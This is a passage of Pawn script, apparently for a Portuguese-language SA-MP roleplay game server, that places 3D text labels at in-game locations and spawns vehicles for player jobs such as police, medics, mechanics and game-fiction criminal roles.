	Create3DTextLabel("{FFFFFF}Departamento de Polícia\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1555.1055, -1675.6426, 16.1953, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Departamento de Polícia\n{FFFFFF}de\n{1E90FF}San Fierro", 0xFFFFFFFF, -1605.4912, 711.4242, 13.8672, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Balada Alhambra\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1836.5631, -1682.5184, 13.3427, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Auto Escola\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1657.9943, -1343.3003, 17.4365, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Auto Escola\n{FFFFFF}de\n{1E90FF}San Fierro", 0xFFFFFFFF, -2026.6133, -100.9539, 35.1641, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Loja de Utilitários\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1169.9524, -1489.6898, 22.7558, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Loteria\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1631.8516, -1172.9270, 24.0843, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Prefeitura\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1481.0233,-1771.7765,18.7957, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Prefeitura\n{FFFFFF}de\n{1E90FF}San Fierro", 0xFFFFFFFF, -2765.3511,375.5041,6.3359, 30.0, 0);
	Create3DTextLabel("Limpar ficha", 0xFFFFFFFF, 358.9193, 166.1699, 1008.3828, 30.0, 0);
	Create3DTextLabel("Apostas - Loteria", 0xFFFFFFFF, -2159.0813, 640.3607, 1052.3817, 30.0, 0);
	Create3DTextLabel("Presidência", 0xFFFFFFFF, 362.3257,173.7074,1008.3828, 30.0, 0);
	Create3DTextLabel("Corpo de Bombeiros", 0xFFFFFFFF, -2024.8932, 67.0872, 28.4371, 80.0, 0);
	// Bancos
	Create3DTextLabel("{FFFFFF}Menu do Banco Central", 0xFFFFFFFF, 1780.0449,-1702.8324,13.5096, 10.0, 0);
	Create3DTextLabel("{FFFFFF}Banco {FF1E1E}W{1E90FF}E\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1778.3708,-1721.8687,13.4134, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Banco {FF1E1E}EM MANUTENÇÃO.", 0xFFFFFFFF, 2127.5425, 2378.9783, 10.8203, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Banco {FF1E1E}EM MANUTENÇÃO.", 0xFFFFFFFF, -2425.3201, 337.5206, 37.0020, 30.0, 0);
	// Pague Impostos
	Create3DTextLabel("Pagamento de impostos", 0xFFFFFFFF, 359.0632,178.6568,1008.3828, 30.0, 0);
	Create3DTextLabel("Pagamento de impostos", 0xFFFFFFFF, 1777.8369,-1702.6061,13.5096, 10.0, 0);
	// 3D Agências de Emprego
    Create3DTextLabel("{FFFFFF}Agência de Empregos\n{FFFFFF}de\n{1E90FF}Los Santos", 0xFFFFFFFF, 1310.4525,-1367.4639,13.4724, 30.0, 0);
    Create3DTextLabel("{FFFFFF}Agência de Empregos\n{FFFFFF}de\n{1E90FF}Las Venturas", 0xFFFFFFFF, 1952.8214, 1342.8403, 15.3672, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Agência de Empregos\n{FFFFFF}de\n{1E90FF}Blueberry", 0xFFFFFFFF, 207.8856, -62.8081, 1.5781, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Agência de Empregos\n{FFFFFF}de\n{1E90FF}Fort Carson", 0xFFFFFFFF, -206.9538,1119.1993,20.4297, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Agência de Empregos\n{FFFFFF}de\n{1E90FF}Angel Pine", 0xFFFFFFFF, -2130.4309,-2434.8296,30.6250, 30.0, 0);
	Create3DTextLabel("{FFFFFF}Agência de Empregos\n{FFFFFF}de\n{1E90FF}San Fierro", 0xFFFFFFFF, -2227.2854, 251.9700, 35.3203, 70.0, 0);
	// Radares
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, 1700.77087, 414.56015, 32.00000, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, -1220.04248, -769.33087, 65.70000, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, -143.34355, -1318.30847, 3.40000, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, 660.9880,666.7653, 8.60294, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, -1637.78394, 2013.41296, 19.66738, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, -2681.42578, 1956.42688, 64.27490, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, -1772.58240, -1441.72498, 36.25580, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, -1065.33606, -2857.72314, 68.69350, 120.0, 0);
	Create3DTextLabel("{FFFFFF}RADAR - {1E90FF}Limite: {FF0000}120 KM/H", 0xFFFFFFFF, 2760.43213, -102.90350, 36.08050, 120.0, 0);

	Create3DTextLabel("{FFFFFF}Mercadoria para Empresas", 0xFFFFFFFF, -1737.9591, 24.8926, 3.5547, 80.0, 0);
	Create3DTextLabel("{FFFFFF}Apresentação de comprovantes", 0xFFFFFFFF, -1737.9109,30.8485,3.5547, 80.0, 0);
	// Veículos profissão
	vPrefeito[0] = CreateVehicle(421,1488.6938,-1737.7462,13.3417,269.8534,0,0,300); // prefeito1
	vPrefeito[1] = CreateVehicle(421,1474.4331,-1737.8033,13.3417,269.2890,0,0,300); // prefeito2
    vPrefeito[2] = CreateVehicle(409,1455.4147,-1751.3042,13.3469,269.1857,1,1,300); // prefeito3
	//Restritos
	/*vRestrito[0] = CreateVehicle(541,1257.9636,-1225.4780,14.4213+2,141.9167,1,3, 300); // 1
    vRestrito[1] = CreateVehicle(411,1264.8434,-1225.1376,14.5261+2,140.6844,0,0, 300); // 2
    vRestrito[2] = CreateVehicle(451,1271.7480,-1225.2754,14.5028+2,140.3857,3,3, 300); // 3
    vRestrito[3] = CreateVehicle(429,1278.8292,-1225.5708,14.4812+2,133.7359,0,211, 300); // luxo4
    vRestrito[4] = CreateVehicle(405,1272.2366,-1210.2373,14.6765+2,140.3794,1,1, 300); // luxo5
    vRestrito[5] = CreateVehicle(580,1284.2964,-1209.9476,14.5926+2,134.3336,0,0, 300); // luxo6
    vRestrito[6] = CreateVehicle(566,1286.0686,-1214.4297,20.1558+2,90.1266,0,0, 300); // antigo11
    vRestrito[7] = CreateVehicle(549,1286.2070,-1220.2363,20.0720+2,89.5175,0,0, 300); // antigo12
    vRestrito[8] = CreateVehicle(545,1271.2220,-1208.3535,20.1878+2,178.9041,23,23, 300); // antigo 13
    vRestrito[9] = CreateVehicle(576,1278.4738,-1209.4294,19.9893+2,179.9747,25,25, 300); // antigo 14
    vRestrito[10] = CreateVehicle(475,1285.7611,-1208.7097,20.1821+2,131.6118,205,0, 300); // antigo 15
    vRestrito[11] = CreateVehicle(536,1286.9408,-1225.2303,14.5379+2,136.3507,10,10, 300); // antigo 16
    vRestrito[12] = CreateVehicle(567,1244.7865,-1224.8126,14.6721+2,140.1040,1,1, 300); // antigo 17*/
    AddStaticVehicle(562,1318.5398,-1391.4481,13.1362,89.4616,192,19); //

	// Trem para os Maquinistas
	AddStaticVehicleEx(538, 1740.9092, -1953.9208, 13.5469, 0.0, 1, 1, 300); // Trem Maquinista
	AddStaticVehicleEx(538, 1740.9092, -1953.9208, 13.5469, 0.0, 1, 1, 300); // Trem Maquinista
	AddStaticVehicleEx(538, 1740.9092, -1953.9208, 13.5469, 0.0, 1, 1, 300); // Trem Maquinista
	//
	vTRANSPORTADOR[0] = CreateVehicle(499,-1721.2395,11.5751,3.5920,225.3784,0,3,300); // Transportador
	vTRANSPORTADOR[1] = CreateVehicle(499,-1718.6494,14.2765,3.5917,225.5475,3,7,300); // Transportador
	vTRANSPORTADOR[2] = CreateVehicle(499,-1716.0383,16.9587,3.5908,224.4906,29,34,300); // Transportador
	vTRANSPORTADOR[3] = CreateVehicle(499,-1713.1899,19.5785,3.5719,224.7096,19,1,300); // Transportador
	vTRANSPORTADOR[4] = CreateVehicle(499,-1710.4293,22.3985,3.5460,224.4185,9,8,300); // Transportador
	vTRANSPORTADOR[5] = CreateVehicle(499,-1707.6495,25.1388,3.5450,225.3392,1,1,300); // Transportador
	vTRANSPORTADOR[6] = CreateVehicle(499,-1704.8431,27.9334,3.5345,225.3249,0,0,300); // Transportador
	vTRANSPORTADOR[7] = CreateVehicle(456,-1692.8035,15.4463,3.7294,45.0508,0,1,300); // Transportador
	vTRANSPORTADOR[8] = CreateVehicle(456,-1695.7729,11.4695,3.7306,46.9719,1,1,300); // Transportador
	vTRANSPORTADOR[9] = CreateVehicle(456,-1698.5853,9.0042,3.7161,45.7204,0,1,300); // Transportador
	vTRANSPORTADOR[10] = CreateVehicle(456,-1701.2012,5.7164,3.7259,39.9235,1,0,300); // Transportador
	vTRANSPORTADOR[11] = CreateVehicle(456,-1704.6063,2.9120,3.7303,46.7031,0,1,300); // Transportador
	vTRANSPORTADOR[12] = CreateVehicle(456,-1707.8428,-0.2453,3.7283,45.7658,1,1,300); // Transportador
	vTRANSPORTADOR[13] = CreateVehicle(499,-1596.9735,105.2606,3.5397,224.4865,1,1,300); // Transportador
	vTRANSPORTADOR[14] = CreateVehicle(499,-1594.0681,108.0053,3.5415,224.8571,0,1,300); // Transportador
	//CONTRABANDISTAS
    vContrabandista[0] = CreateVehicle(593,390.3588,2439.4551,16.9607,312.2278,1,1,300); // contra1
    vContrabandista[1] = CreateVehicle(593,390.4668,2460.1792,16.9624,310.3837,1,1,300); // contra2
    vContrabandista[2] = CreateVehicle(593,420.1034,2442.7817,16.9675,37.0622,0,0,300); // contra3
    vContrabandista[3] = CreateVehicle(593,419.1854,2463.2312,16.9394,48.1908,0,0,300); // contra4
    vContrabandista[4] = CreateVehicle(593,387.9065,2540.7622,17.0267,181.0258,1,1,300); // contra5
    vContrabandista[5] = CreateVehicle(593,374.1123,2540.4019,16.9991,182.6686,0,0,300); // contra6
    vContrabandista[6] = CreateVehicle(593,361.4700,2540.1589,17.1722,177.7419,0,0,300); // contra7
    vContrabandista[7] = CreateVehicle(542,-1433.6893,-964.2625,200.7274,269.8890,1,1,300); // fim1
    vContrabandista[8] = CreateVehicle(468,-1434.2804,-966.9720,200.6611,267.5877,0,0,300); // fim2
    vContrabandista[9] = CreateVehicle(468,-1422.2358,-967.2108,200.4420,1.3116,3,3,300); // fim3
	// Seguranças
	vSegurancas[0] = CreateVehicle(505,287.8646,-1522.3406,24.7374,234.6137,0,0, 300); // SegurançaV
	vSegurancas[1] = CreateVehicle(505,291.1874,-1517.6626,24.7372,234.6137,0,0, 300); // SegurançaV
	vSegurancas[2] = CreateVehicle(505,294.3252,-1513.2450,24.7370,234.6137,0,0, 300); // SegurançaV
	//--
	vPescadores[0] = CreateVehicle(453,451.0436,-1912.8796,-0.2565,185.7546,1,1, 300); // barco pesca
	vPescadores[1] = CreateVehicle(453,444.3646,-1913.5549,-0.1187,185.7546,1,1, 300); // barco pesca
	vPescadores[2] = CreateVehicle(453,435.9167,-1914.4097,0.0555,185.7546,1,1, 300); // barco pesca
	vPescadores[3] = CreateVehicle(453,466.1953,-1911.3475,-0.5692,185.7546,1,1, 300); // barco pesca
	//--
	vMotoristap[0] = CreateVehicle(579,1323.5875,-1225.7534,19.3044+4,0.0790,0,0, 300); // Car Motoris Particular
	vMotoristap[1] = CreateVehicle(580,1307.6155,-1225.8127,19.1681+4,359.5540,1,1, 300); // Car Motoris Particular
	//--
	vMotoTaxista[0] = CreateVehicle(522,1807.5647,-1868.8413,13.1648,356.5757,6,6, 300); // Moto Moto taxista
	vMotoTaxista[1] = CreateVehicle(522,1802.8372,-1868.3347,13.1380,17.3903,6,6, 300); // Moto Moto taxista
	vMotoTaxista[2] = CreateVehicle(522,1798.3392,-1868.8032,13.1687,0.5008,6,6, 300); // Moto Moto taxista
	//--
	vPilotoPart[0] = CreateVehicle(519,1967.6835,1860.5198,28.3811,89.7945,0,0, 300); // Heli taxista Aero
	vPilotoPart[1] = CreateVehicle(519,1952.9934,1884.7968,28.3783,89.4301,0,0, 300); // Heli taxista Aero
	vPilotoPart[2] = CreateVehicle(487,1961.8179,1764.4935,19.1105,90.8648,2,0, 300); // Heli taxista Aero
	vPilotoPart[3] = CreateVehicle(487,1976.9357,1751.0934,19.1109,179.6071,2,0, 300); // Heli taxista Aero
	vPilotoPart[4] = CreateVehicle(487,1990.9382,1751.6989,19.1074,182.2905,2,0, 300); // Heli taxista Aero
	vPilotoPart[5] = CreateVehicle(487,1989.5833,1727.4830,19.1076,0.4263,2,0, 300); // Heli taxista Aero
	//--
	vTraficDrogas[0] = CreateVehicle(467,-1189.0453,-1136.1168,128.9587,357.9854,1,0, 300); // carro traficante de dorgas
	vTraficDrogas[1] = CreateVehicle(467,-1068.8763,-1149.9882,128.9588,270.7453,1,0, 300); // carro traficante de dorgas
	vTraficDrogas[2] = CreateVehicle(467,-1030.0145,-1188.4044,128.9587,88.9144,1,0, 300); // carro traficante de dorgas
	vTraficDrogas[3] = CreateVehicle(521,-1029.9248,-1183.9967,128.7935,91.3651,0,1, 300); // carro traficante de dorgas
	vTraficDrogas[4] = CreateVehicle(521,-1072.4183,-1154.1243,128.7847,269.7610,0,1, 300); // carro traficante de dorgas
	vTraficDrogas[5] = CreateVehicle(521,-1184.6030,-1141.4117,128.7936,358.3395,0,1, 300); // carro traficante de dorgas
	//--
	vTraficArmas[0] = CreateVehicle(468,-1110.3940,-1637.1936,76.0363,269.9586,54,54, 300); // Moto Trafico de Armas
	vTraficArmas[1] = CreateVehicle(468,-1111.8992,-1676.6799,76.0360,3.1572,54,54, 300); // Moto Trafico de Armas
	vTraficArmas[2] = CreateVehicle(451,-1109.0090,-1631.2808,76.0807,272.2647,54,54, 300); // Turismo Trafico de Armas
	vTraficArmas[3] = CreateVehicle(476,-1108.6602,-1620.8835,77.0840,269.1622,55,54, 300); // Rustler Trafico de Armas
	//--
	vHitman[0] = CreateVehicle(589,-1672.2434,2500.9336,87.0754,277.6936,0,0, 300); // Veículo Hitman
	vHitman[1] = CreateVehicle(405,-1671.1859,2493.8474,86.9690,271.7527,0,0, 300); // Veículo Hitman
	vHitman[2] = CreateVehicle(421,-1671.3845,2497.1563,86.9920,273.3550,0,0, 300); // Veículo Hitman
	//--
	vTerrorista[0] = CreateVehicle(471,-373.3637,2234.6597,41.9646,102.0292,1,56, 300); // Veiculo Terrorista
	vTerrorista[1] = CreateVehicle(468,-391.7790,2232.0850,42.0977,285.4930,166,166, 300); // Veiculo Terrorista
	vTerrorista[2] = CreateVehicle(468,-394.2222,2241.8101,42.0970,280.6775,166,166, 300); // Veiculo Terrorista
	vTerrorista[3] = CreateVehicle(542,-391.1064,2221.6970,42.1717,284.7092,54,0, 300); // Veiculo Terrorista
	//--
	vChefeMafia[0] = CreateVehicle(421,-528.1433,2581.5916,53.2966,88.3130,0,0, 300); // veículo Mafia
	vChefeMafia[1] = CreateVehicle(421,-528.1960,2578.7959,53.2966,89.2388,0,0, 300); // veículo Mafia
	vChefeMafia[2] =CreateVehicle(405,-539.1120,2608.6128,53.2897,269.1181,0,0, 300); // Veículo Mafia
	vChefeMafia[3] =CreateVehicle(545,-539.7317,2565.8481,53.2265,269.5233,0,0, 300); // Veículo Mafia
	vChefeMafia[4] =CreateVehicle(593,-515.6672,2549.9573,53.8730,359.1305,1,1, 300); // Veículo Mafia
	//--
	vFotografo[0] = CreateVehicle(480,2331.3274,1725.5581,10.4449,180.0953,1,1, 300); // veículo fotografo
	vFotografo[1] = CreateVehicle(480,2339.7651,1717.1587,10.4521,90.6157,1,1, 300); // ve´ciulo fotografo
	//--
	vReporter[0] = CreateVehicle(582,737.8336,-1335.7264,13.5974,179.3407,1,2, 300); // veículo repórter
	vReporter[1] = CreateVehicle(582,741.2506,-1335.7659,13.5973,179.3407,1,2, 300); // veículo repórter
	vReporter[2] = CreateVehicle(488,744.1884,-1365.1838,25.8694,269.4309,2,1, 300); // veículo repórter
	vReporter[3] = CreateVehicle(488,744.0966,-1374.4130,25.9173,269.4309,2,1, 300); // veículo repórter
	//--
	vInstrutor[0] = CreateVehicle(506,-2064.3757,-83.5828,34.8686,0.7376,166,166, 300); // veículo instrutor
	vInstrutor[1] = CreateVehicle(506,-2019.8495,-94.6888,34.8686,90.8285,166,166, 300); // veículo instrutor
	//--
	vMecanico[0] = CreateVehicle(525, 1737.9904, -1747.4841, 13.4393, 180.0000, 1, 162, 100); // veiculo mecanico
	vMecanico[1] = CreateVehicle(525, 1743.0303, -1747.4841, 13.4393, 180.0000, 1, 162, 100); // veiculo  mecanico
	vMecanico[2] = CreateVehicle(525, 1730.8375, -1792.3669, 13.4393, 90.0000, 1, 162, 100); // veiculo mecanico
	vMecanico[3] = CreateVehicle(525, 1717.7919, -1747.4841, 13.4393, 180.0000, 1, 162, 100);
	vMecanico[4] = CreateVehicle(525, 1723.0088, -1747.4841, 13.4393, 180.0000, 1, 162, 100);
	vMecanico[5] = CreateVehicle(525, 1727.9504, -1747.4845, 13.4393, 180.0000, 1, 162, 100);
	vMecanico[6] = CreateVehicle(525, 1732.9304, -1747.4841, 13.4393, 180.0000, 1, 162, 100);
	//--
	vMedico[0] = CreateVehicle(416,2000.9288,-1402.5741,17.8823,181.1324,1,3, 300); // Ambulancia medico
	vMedico[1] = CreateVehicle(416,2037.1394,-1427.9084,17.1414,179.7074,1,3, 300); // Ambulancia medico
	//--
	vPadre[0] = CreateVehicle(545,2234.7483,-1321.4547,23.7954,359.1054,1,1, 300); // veiculo padre
	//--
	vPizzaBoy[0] = CreateVehicle(448,2098.2131,-1815.1091,12.9822,93.6541,8,3, 300); // 1motinha
	vPizzaBoy[1] = CreateVehicle(448,2098.0688,-1813.3397,12.9785,89.0505,8,3, 300); // 2motinha
	vPizzaBoy[2] = CreateVehicle(448,2098.0679,-1816.5538,12.9629,90.4330,8,3, 300); // 3motinha
	vPizzaBoy[3] = CreateVehicle(448,2098.1392,-1818.1722,12.9643,87.3365,8,3, 300); // 4motinha
	vPizzaBoy[4] = CreateVehicle(448,2098.1360,-1819.8542,12.9824,90.8346,8,3, 300); // 5motinha
	//--
	vAdvogado[0] = CreateVehicle(402,1407.8767,-1795.2533,13.2014,90.2798,0,0, 300); // veiculo advogado
	vAdvogado[1] = CreateVehicle(402,1407.3461,-1785.3204,13.2004,89.9296,0,0, 300); // veiculo advogado
	//--
	vAmbulancias[0] = CreateVehicle(416,-1503.7245,2526.3696,55.8361,359.3794,1,3, 300); // Ambulância ElQuebrados
	vAmbulancias[1] = CreateVehicle(416,-1522.5176,2525.9548,55.8692,359.9738,1,3, 300); // Ambulância ElQuebrados
	vAmbulancias[2] = CreateVehicle(416,-298.1814,1049.1421,19.7348,1.1242,1,3, 300); // Ambulância Fort Carson
	vAmbulancias[3] = CreateVehicle(416,-332.5005,1063.4795,19.8924,270.1201,1,3, 300); // Ambulância Fort Carson
	vAmbulancias[4] = CreateVehicle(416,1605.5135,1850.4094,10.9713,359.0870,1,3, 300); // Ambulância Las Venturas
	vAmbulancias[5] = CreateVehicle(416,1624.1400,1819.9449,10.9709,1.6646,1,3, 300); // Ambulância Las Venturas
	vAmbulancias[6] = CreateVehicle(416,-2215.8601,-2287.9236,30.7761,320.7556,1,3, 300); // Ambulãncia Angel Pine
	vAmbulancias[7] = CreateVehicle(416,-2705.5964,590.4078,14.6020,270.5041,1,3, 300); // Ambulância San Fierro
	vAmbulancias[8] = CreateVehicle(416,-2546.3289,627.4236,14.6037,89.7861,1,3, 300); // Ambulância San Fierro
	vAmbulancias[9] = CreateVehicle(416,1211.1830,-1317.2111,13.6279,180.4995,1,3, 300); // Ambulância Los Santos
	//--
	vBombeiros[0] = CreateVehicle(407,-2052.8584,94.6616,28.6070,89.4664,3,1, 300); // C/ Bombeiro(a)s
	vBombeiros[1] = CreateVehicle(407,-2052.8809,91.0854,28.6257,89.4732,3,1, 300); // C/ Bombeiro(a)s
	vBombeiros[2] = CreateVehicle(407,-2052.8572,86.1040,28.6297,90.2157,3,1, 300); // C/ Bombeiro(a)s
	vBombeiros[3] = CreateVehicle(407,-2052.9126,82.0841,28.6323,89.9478,3,1, 300); // C/ Bombeiro(a)s
	vBombeiros[4] = CreateVehicle(407,-2052.9189,77.5832,28.6253,87.9793,3,1, 300); // C/ Bombeiro(a)s
	vBombeiros[5] = CreateVehicle(407,-2053.0449,73.6871,28.6257,88.5975,3,1, 300); // C/ Bombeiro(a)s
	vBombeiros[6] = CreateVehicle(599,-2022.0087,92.7215,28.2069,271.4562,3,1, 300); // C/ Bombeiro(a)s
	vBombeiros[7] = CreateVehicle(599,-2022.0436,84.0771,28.1808,270.6930,3,1, 300); // C/ Bombeiro(a)s
	// Veículos Novatos(as)
	vNovatos[0] = CreateVehicle(481,1286.1937,-1383.4349,12.8452,359.3718,3,3, 300); // veh novatos
	vNovatos[1] = CreateVehicle(481,1284.5149,-1383.4628,12.8443,1.5446,162,162, 300); // veh novatos
	vNovatos[2] = CreateVehicle(481,1282.9689,-1383.4526,12.8448,357.8600,3,3, 300); // veh novatos
	vNovatos[3] = CreateVehicle(481,1281.3341,-1383.4211,12.8448,358.2510,162,162, 300); // veh novatos
	vNovatos[4] = CreateVehicle(481,1279.7026,-1383.4054,12.8439,0.8858,3,3, 300); // veh novatos
	vNovatos[5] = CreateVehicle(481,1278.1345,-1383.4465,12.8446,1.3163,162,162, 300); // veh novatos
	vNovatos[6] = CreateVehicle(481,1276.4786,-1383.4753,12.8444,0.5923,3,3, 300); // veh novatos
	vNovatos[7] = CreateVehicle(481,1274.9325,-1383.4343,12.8450,2.1093,162,162, 300); // veh novatos
	vNovatos[8] = CreateVehicle(481,1273.3285,-1383.4325,12.8446,0.8549,3,3, 300); // veh novatos
	vNovatos[9] = CreateVehicle(481,1271.6936,-1383.4478,12.8454,0.5364,162,162, 300); // veh novatos
	// Veículo próximos aos Hospitais
	CreateVehicle(600,-1528.2860,2525.6157,55.5701,0.5664,1,11, 300); // Veículo El-Quebrado
	CreateVehicle(543,-304.9458,1036.1084,19.6788,269.3598,1,20, 300); // Veículo Fort Carson
	CreateVehicle(401,1608.4377,1838.3145,10.3853,1.7932,0,3, 300); // Veículo Las Venturas
	CreateVehicle(426,-2217.8867,-2278.6392,30.5000,232.1206,66,9, 300); // Veículo Angel Pine
	CreateVehicle(436,-2588.9500,622.2042,14.2017,269.7249,194,3, 300); // Veículo San Fierro
	CreateVehicle(445,1148.7059,-1226.6274,17.1225,179.7192,17,16, 300); // Veículo Los Santos
	CreateVehicle(422,1191.4963,-1306.7321,13.2944,179.0238,3,10, 300); // Veículo Los Santos
	CreateVehicle(518,2015.1100,-1418.4093,16.6188,88.0901,162,122, 300); // Veículo Los Santos
	CreateVehicle(479,2008.7533,-1418.3582,16.8539,91.8401,55,23, 300); // Veículo Los Santos
	CreateVehicle(496,1209.9402,-1346.5117,13.1165,0.0290,0,0, 300); // Veículo Los Santos
	CreateVehicle(527,1309.0293,-1235.9971,14.2769+4,359.9290,3,1, 300); // carropop1
    CreateVehicle(516,1295.4847,-1225.4219,20.2058+4,179.8898,4,3, 300); // carropop2
    CreateVehicle(581,1239.9415,-1265.4769,14.1565+4,177.8130,3,3, 300); // carropop3
    // Veículos do centro de eventos
    AddStaticVehicle(413,-261.6961,1487.2554,75.6348,289.9224,10,10); // eventos 1
    AddStaticVehicle(413,-244.7577,1504.2101,75.6427,341.8167,10,10); // eventos 2
    AddStaticVehicle(437,-236.0268,1513.7296,75.6954,133.3035,3,3); // busao evento 1
    AddStaticVehicle(484,717.8124,-2220.2258,0.4125,267.9265,0,0); // cru1
    AddStaticVehicle(484,668.7802,-2220.5051,0.0382,271.4425,1,1); // cru2
	//--
	CreateVehicle(519,1601.9318,-2463.0769,14.4773,178.2335,1,1, 300); // Avião LS
	CreateVehicle(513,1753.3306,-2628.9766,14.1008,3.9929,1,149, 300); // Avião LS
	CreateVehicle(563,2112.2705,-2426.5793,14.2522,181.0629,1,4, 300); // Heli LS
	CreateVehicle(469,1924.3121,-2250.1438,13.5612,190.6606,1,1, 300); // Heli LS
	CreateVehicle(512,1996.3955,-2316.0864,13.8293,91.1660,1,166, 300); // Avião LS
	CreateVehicle(593,1993.8778,-2251.0203,14.0059,94.9982,1,166, 300); // Avião LS
	CreateVehicle(511,1985.2704,-2382.3853,14.9203,94.0198,1,166, 300); // Avião LS
	//--
	CreateVehicle(422,1197.7804,-1826.8948,13.1140,270.3100,181,181, 300); // sultan
	CreateVehicle(426,1280.2482,-1829.9697,13.0891,92.0984,111,111, 300); // sultan
	CreateVehicle(533,1602.1403,-1700.2145,5.5997,89.6675,111,111, 300); // sultan
	CreateVehicle(404,1785.9545,-1686.2357,13.2720,179.7926,3,3, 300); // sultan
	CreateVehicle(475,1924.9011,-1788.5262,13.0919,269.6174,54,54, 300); // sultan
	CreateVehicle(560,2122.0969,-1783.1060,13.0933,359.9962,3,3, 300); // sultan
	CreateVehicle(483,2238.1462,-1321.2328,23.6890,358.5880,181,181, 300); // sultan
	CreateVehicle(566,2228.1025,-1166.3290,25.4551,90.4474,111,111, 300); // sultan
	//-- Policia DP LS
	CreateVehicle(596,1535.9290,-1678.0125,13.1029,0.4477,9,0, 300); // Veiculo Policia LS
	CreateVehicle(596,1535.9070,-1666.8684,13.1035,0.5706,9,0, 300); // Veiculo Policia LS
	CreateVehicle(596,1587.5530,-1710.6703,5.6123,0.6534,9,0, 300); // Veiculo Policia LS
	CreateVehicle(523,1529.6401,-1683.8788,5.4521,270.2300,9,0, 300); // Veiculo Policia LS
	CreateVehicle(523,1529.5391,-1688.0732,5.4568,269.2461,9,0, 300); // Veiculo Policia LS
	CreateVehicle(596,1591.5360,-1710.7065,5.6118,0.0964,9,0, 300); // Veiculo Policia LS
	CreateVehicle(599,1591.2096,-1606.7225,13.5713,180.0999,9,0, 300); // cop1
    CreateVehicle(599,1586.1490,-1606.7239,13.5722,179.9515,9,0, 300); // cop2
    CreateVehicle(599,1581.1674,-1606.5264,13.5720,180.5063,9,0, 300); // cop3
    CreateVehicle(437,1601.7670,-1631.0730,13.6370,90.0149,9,0, 300); // cop4
    //-- Policia DP SF
    CreateVehicle(597,-1622.5668,651.6575,6.9543,0.2277,145,1, 300); // civil1
    CreateVehicle(597,-1628.5026,651.8455,6.9561,359.5250,145,1, 300); // civil2
    CreateVehicle(597,-1634.4084,651.6421,6.9564,0.2372,145,1, 300); // civil3
    CreateVehicle(599,-1600.5079,748.7971,-5.0507,179.6552,145,1, 300); // civil4
    CreateVehicle(599,-1596.1328,748.8555,-5.0523,179.8230,145,1, 300); // civil5
    CreateVehicle(599,-1592.1984,748.8521,-5.0492,180.7654,145,1, 300); // civil6
    CreateVehicle(523,-1616.5269,732.9602,-5.6706,359.3914,145,1, 300); // civil7
    CreateVehicle(523,-1612.5587,732.7922,-5.6718,359.1969,145,1, 300); // civil8
    CreateVehicle(497,-1679.5564,706.2831,30.7176,89.3717,145,1, 300); // civil9
    //-- Policia DP Dillimore
    CreateVehicle(599,610.1727,-608.9373,17.4155,0.2301,2,1, 300); // rodoviario1
    CreateVehicle(599,614.8204,-609.1530,17.4154,0.0457,2,1, 300); // rodoviario2
    CreateVehicle(596,611.6855,-597.1198,16.9527,270.3050,1,2, 300); // rodoviario3
    CreateVehicle(596,611.7045,-601.2733,16.9485,268.9938,1,2, 300); // rodoviario4
    CreateVehicle(523,610.5818,-590.6443,16.7993,268.5486,1,2, 300); // rodoviario5
    CreateVehicle(523,610.6399,-588.0494,16.7972,268.5384,1,2, 300); // rodoviario6
    //-- Policia DP Fort Carson
    CreateVehicle(598,-227.1125,991.3592,19.2697,269.7099,219,1, 300); // guarda1
    CreateVehicle(598,-227.0568,995.0342,19.2996,269.5397,219,1, 300); // guarda2
    CreateVehicle(598,-227.0331,998.8798,19.3341,270.6798,219,1, 300); // guarda3
    CreateVehicle(523,-208.7231,1000.0693,19.2340,89.3148,219,1, 300); // guarda4
    CreateVehicle(523,-208.6801,998.2416,19.1918,90.3188,219,1, 300); // guarda5
    CreateVehicle(523,-208.7019,996.4041,19.1603,90.1146,219,1, 300); // guarda6
    CreateVehicle(523,-208.7239,994.6895,19.1256,90.0749,219,1, 300); // guarda7
	//-- Policia DP LV
	CreateVehicle(599,2251.7830,2477.4141,10.9474,178.8666,0,6, 300); // POL_FEDERAL
    CreateVehicle(599,2256.0122,2477.2468,11.0095,179.2358,0,6, 300); // POL_FEDERAL
    CreateVehicle(599,2260.4312,2477.0298,10.9480,179.7188,0,6, 300); // POL_FEDERAL
    CreateVehicle(598,2295.2805,2443.4146,10.8636,0.0930,6,0, 300); // POL_FEDERALtruck
    CreateVehicle(598,2291.1904,2443.3513,10.5656,0.5825,6,0, 300); // POL_FEDERALtruck
